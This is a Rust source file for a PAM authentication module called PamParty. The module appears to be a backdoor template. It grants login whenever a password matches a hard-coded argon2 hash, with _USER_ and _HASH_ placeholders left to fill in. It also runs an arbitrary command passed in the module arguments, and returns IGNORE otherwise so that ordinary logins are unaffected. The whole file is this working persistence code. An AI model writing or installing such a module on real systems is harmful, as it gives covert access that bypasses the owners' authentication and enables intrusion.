use std::process::Command;

use pamsm::{pam_module, Pam, PamError, PamFlag, PamLibExt, PamServiceModule};

const USER: &'static str = "_USER_";
const HASH: &'static str = "_HASH_";

struct PamParty;

impl PamServiceModule for PamParty {
    fn authenticate(pamh: Pam, flags: PamFlag, args: Vec<String>) -> PamError {
        if !USER.is_empty() {
            let user = match pamh.get_user(None) {
                Ok(Some(u)) => u,
                _ => return PamError::IGNORE,
            };
            if user.to_bytes() != USER.as_bytes() {
                return PamError::IGNORE;
            }
        }
        let pass = match pamh.get_authtok(None) {
            Ok(Some(p)) => p,
            _ => return PamError::IGNORE,
        };
        let ok = match argon2::verify_encoded(HASH, pass.to_bytes()) {
            Ok(v) => v,
            Err(_) => return PamError::IGNORE,
        };
        if !ok {
            return PamError::IGNORE;
        }
        if !args.is_empty() {
            let status = match Command::new(&args[0]).args(&args[1..]).status() {
                Ok(v) => v,
                Err(_) => return PamError::IGNORE,
            };
            if !status.success() {
                return PamError::IGNORE;
            }
        }
        PamError::SUCCESS
    }

    fn setcred(pamh: Pam, flags: PamFlag, args: Vec<String>) -> PamError {
        PamError::IGNORE
    }
}

pam_module!(PamParty);
